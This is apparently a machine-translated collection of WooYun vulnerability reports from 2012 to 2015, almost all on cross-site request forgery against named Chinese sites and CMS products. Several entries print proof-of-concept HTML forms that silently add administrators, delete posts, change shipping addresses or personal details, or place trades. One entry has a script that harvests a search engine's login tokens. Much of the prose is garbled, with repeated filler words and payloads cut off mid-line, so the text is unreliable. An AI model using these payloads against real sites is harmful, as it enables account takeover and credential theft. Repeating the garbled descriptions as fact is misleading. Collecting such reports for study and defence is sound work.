1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1. analyze the follow request,isPOSTrequest2.useGETmethodtryunder,founduseis$_REQUEST GETmethodsametextcanrequest,thattextthencantext peopletextCSRF,handletranslated textthenispostpage.3. postreplytextimg srcashttps://example.com/[redacted] foundbelocationhandle,thentextemoji image cantranslated text,slowly found,foundimg srcnotextimagesuffixwillbefilter.4. Bypassimagesrcrestrictionconstruct,add aa=a.gif https://example.com/[redacted] texttosame follower-boosting effect.

**POC**: oneposttextcomefollowersonetextontextonetext~

**Bypass**: filterBypass

**Fix**: $_REQUEST thiscanconstructcsrftext.etc.underagainusethisimagetextpropagateunder,
---

---
### [wooyun-2012-013213] Douban Shuotextpage clickhijack
**Vendor**: Douban | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: nottextInternet vendorsallhashasthisissue,9textwhenhassomeonetextonetextblog posttextdescriptionthisissue:https://example.com/[redacted]

**POC**: testDouban~ chromeundertestpointthenaffectedtexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Renren and a certain social platforma certain social platformsolutionischeckbenested frameaftertext,butlook atGoogle,Twitter,Facebookallisthrough [X-Frame-Options](https://example.com/[redacted] ) text.text Google
---

---
### [wooyun-2015-0116242] University of International Business and Economicsenergy monitoring platform
**Vendor**: University of International Business and Economics | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: http://[IP redacted]admin123456

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Null;
---

---
### [wooyun-2012-012568] Xianguoone locationCSRF vulnerabilitycan propagateworm
**Vendor**: Xianguo | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.demo address:https://example.com/[redacted] (usernamed/password:imlonghao)log instatusundertextquestion,willautomatically posts onenamedasHello Worlda certain social platform,andwillfollowoneuser.

**POC**: [follow/add follow]vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="beingsIds" value="1378148" /><input type="text" name="parentId" value="0" /><input type="text" name="ftype" value="0" /></form>

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2014-055782] PHPOK CSRFobtainadministrator privileges
**Vendor**: phpok.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: PHPOK CSRFobtainadministrator privileges

**POC**: testenvironment(PHPOK):adduser:capture packetstexttoas followscontent:POST /phpok/admin.php?c=admin&f=save HTTP/1.1Host: www.evil.comProxy-Connection: keep-aliveContent-Length: 67Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: https://example.com/[redacted] Mozilla/5.0 (Windows NT 6.1; WO

**Bypass**: Direct exploitation

**Fix**: 1. textreferersource,according to business logicenterlinerefererfilter.2. addone timestexttoken,sametranslated textrandom unpredictability!
---

---
### [wooyun-2012-013803] Sohu emailcsrf,canstealuseremailandmodifyuserinformationetc.
**Vendor**: a certain portal site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Sohu emailtextcopynottextcsrfdefense,onlytextsendtextonetexthtmlemailtextuser,usertextispointinsidetextlink,can be abused at willtext..issuehasmultiple locations,Ithentranslated textone locationexample.inprovein,Iputuserallemailforward to the specified email,thisdestroytextlarge?

**POC**: sendtexthtmlemailtextattacktextbecausesohuonlytextpostrequest,sotextoneexternal sitelink,textexternal sitesendtogetherpostrequestpointemailinlinkaftercomelook atlook atexternal sitecontentbingo! result

**Bypass**: Direct exploitation

**Fix**: csrfstandard handling,youwill. iftranslated textlarge,thattogethercodecheckoneunderreferer.
---

---
### [wooyun-2014-085436] a certain search enginean interfaceweak authenticationcancross-domainobtainuserlottery sitelog incredential
**Vendor**: a certain search engine | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: iftextina certain search enginehomepagehas peoplea certain search enginetexttab.clickrefresh balance,willsendtextonetextas followsasynchronous request.then,thisrequestsimplifyoneunder,thatsomelook atontextenterlinetextParametersalltext.getundertranslated text.(theseParameterstextonlyislook atontextseemsusecometext,itstextcopytextusetogethercome)https://example.com/[redacted]"errNo": "0","id": "10","data": {"balance": "0yuan","prizeinfo": {"count": "0","url": "https://example.com/[redacted]"},"toke

**POC**: textprovetext?thattheninselfwebsiteontext peopleJScode.professionally collect visitorssingle sign-on address.etc.Itextcollectonepointagaincomeprove.<script type="text/javascript">var url = 'https://example.com/[redacted]';$.getJSON(url,function(json) {var bd_info = json.data.token.bd_info;var bd_bind = json.data.token.bd_bind;var bd_sign = json.data.token.bd

**Bypass**: Direct exploitation

**Fix**: validationtextonepointthenOKtext~~
---

---
### [wooyun-2014-071789] a certain mobile phoneVendortextone locationCSRFcan modifysecurity email
**Vendor**: a certain communications equipment vendor | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisissueandtexta certain mobile phoneVendortextvulnerabilityhttps://example.com/[redacted]

**POC**: textaccountsecurity emailnoadd:directlyGETmethodrequest:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textissue...
---

---
### [wooyun-2015-0110198] a certain sports communityURL redirect+CSRFcanarbitraryspam posts
**Vendor**: a certain sports communitysports site | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: URL redirect:go.hupu.com/u?url=CSRF:bbsreply location  no token,no referertextsohttps://example.com/[redacted] cancantexthasdeceptive

**POC**: <div id="bodyframe" style="VISIBILITY: hidden"><form id="fastform" name="FORM" class="j_atc_content left" method="post" action="https://example.com/[redacted]" onsubmit="textConvert('fastform', 'atc_content')"><!--reply box--><div id="re" class="box"><div id="re_top"></div><div id="re_box"><div class="left

**Bypass**: Direct exploitation

**Fix**: add token and referer checks
---

---
### [wooyun-2014-077794] Huobisimulated Bitcoin tradingCSRF vulnerability
**Vendor**: huobi.com | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>CSRF Hijack</title></head><body><form id="form_add_buy_btc" class="form-horizontal" method="post" action="https://example.com/[redacted]"><div class="control-group"><label class="control-label tx-red" for="zuijiamaijia">best bid price:</label><div class="controls"><label id="zuijiamaijia" class="tx-red" onclick="$('#form_add_buy_btc #mairujia'

**POC**: beforestatus:vulnerabilityform:submitformaftertexttoHuobipageandsuccessdeduct balance:

**Bypass**: Direct exploitation

**Fix**: recommendastranslated textaddtokenorvalidation,becausetranslated textundertextandnotextvalidation,ifmalicious pageandHuobipageonetogetheropenandtextuserlog inHuobitextconsequences are severe
---

---
### [wooyun-2015-0158014] Coolpad MallCSRFhijackshipping address
**Vendor**: yulong.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="addressId" value="" /><input type="hidden" name="receiver" value="test" /><input type="hidden" name="province" value="373" /><input type="hidden" name="city" value="375" /><input type="hidden" name="district" value="404" /><input type="hidden" name="address" value

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0148420] Duitangcsrfcan modifypersonalinformation
**Vendor**: Duitang Information Technology (Shanghai) Co., Ltd. | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifypersonalinformationtext,hascsrf

**POC**: PoC:<html><form action="https://example.com/[redacted]" method=post><input type=text value="aaaaaaaa" name="name" /><input type=text value="15888888888" name="mobile" /><input type=text value="" name="citycode" /><input type=text value="" name="cityname" /><input type=text value

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2013-017294] IistextBypassa certain social platforma certain social platformdefensecontinue boosting followers
**Vendor**: a certain social platforma certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.Iherewilltext2 peoplecase,textseriousstart!2.textissuesiteisa certain social platformmedia,look athere:https://example.com/[redacted]

**POC**: 1.aftertextthiscaseandhosttextonetext,everyonecantranslated text!2.a certain social platformtext peopletranslated textmicro-magazine:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: 1.critical requesttextistextposttextgood!2.critical requesttextisaddtokentextgood!3.reward, reward!busy at year end,textnottexta certain social platformtext,translated textthis kind ofselfless spirit!
---

---
### [wooyun-2015-0159397] throughcraft a POST requestcanforuserarticledelete
**Vendor**: a certain portal site | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisbloginforarticledeletetext,putarticleidasoneParameterssendtextrequest,soNo.threetextcaninusernoclosing the browserthisonetranslated text,craft a POST requestdeleteknownidarticle.

**POC**: <html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="ids" value="310832966" /><input type="submit" value="Submit request" /></form></body></html>inuserflyniuniulog intextin(closing the browserbefore)constructthispostrequest,clickbutton,textcanputidas310832966articledelete.

**Bypass**: Direct exploitation

**Fix**: canexploitsimple server-sidevalidationcode,oristokenvalidationtext
---

---
### [wooyun-2014-065964] ESPCMSthroughcsrfaddadministrator
**Vendor**: ESPCMS enterprise website management system | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: POST /adminsoft/index.php?archive=management&action=managesava HTTP/1.1Host: [IP redacted]Proxy-Connection: keep-aliveContent-Length: 127Accept: */*X-Requested-With: XMLHttpRequestOrigin: http://[IP redacted]User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/[IP redacted]0 Chrome/30.0.1599.101 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Encodi

**POC**: <html><div style="display:none"><form action="http://[IP redacted] id="poc" name="poc" method="post"><input type="hidden" name="inputclass" value=""/><input type="hidden" name="tab" value=""/><input type="hidden" name="username" value=""/><input

**Bypass**: Direct exploitation

**Fix**: addsource or token check.
---
